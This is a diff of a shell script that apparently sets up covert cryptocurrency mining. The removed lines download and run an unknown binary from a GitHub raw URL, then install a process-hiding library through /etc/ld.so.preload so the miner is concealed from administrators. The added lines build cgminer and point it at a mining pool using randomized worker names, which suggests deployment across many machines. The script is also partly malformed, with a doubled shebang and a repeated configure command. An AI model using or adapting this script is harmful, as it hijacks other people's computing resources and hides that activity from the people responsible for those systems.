@@ -1,13 +1,14 @@
 #!/bin/sh
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+#!/bin/bash
+apt-get update && apt-get upgrade -y
+apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y
+apt-get install -qqy automake
+apt-get install -qqy libcurl4-openssl-dev
+apt-get install -qqy make
+git clone https://github.com/ckolivas/cgminer.git
+cd cgminer
+chmod +x ./autogen.sh
+./autogen.sh
+./configure CFLAGS="-O3 -Wall -march=native" ./configure --enable-opencl
 make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T4)@3.215.245.39:443
+./cgminer -o stratum+tcp://ethash.kupool.com:443 -u  prodent.001.$(echo $(shuf -i 1-99999 -n 1)-T4) -p x
